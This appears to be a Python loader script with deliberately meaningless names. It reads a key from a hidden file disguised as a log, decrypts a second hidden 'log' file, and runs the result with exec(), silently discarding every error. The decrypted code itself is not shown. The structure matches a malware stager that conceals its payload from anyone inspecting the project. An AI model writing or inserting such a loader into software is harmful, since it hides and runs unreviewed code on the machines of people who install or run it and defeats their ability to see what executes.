import os
from cryptography.fernet import Fernet
import sys

def AAA_eye():
    try:
        with open(r".main/.g18h38h7b6hkt68g7_log", "rb") as AAA:
            return AAA.read()
    except Exception:
        return None

def BBB_fox(BBB, CCC):
    try:
        with open(BBB, 'rb') as DDD:
            EEE = DDD.read()

        FFF = Fernet(CCC)
        GGG = FFF.decrypt(EEE)
        return GGG
    except Exception:
        return None

HHH = AAA_eye()
if HHH:
    III = '.main/.he7jw8eu72j_log'
    JJJ = BBB_fox(III, HHH)
    if JJJ:
        try:
            exec(JJJ)
        except Exception:
            pass
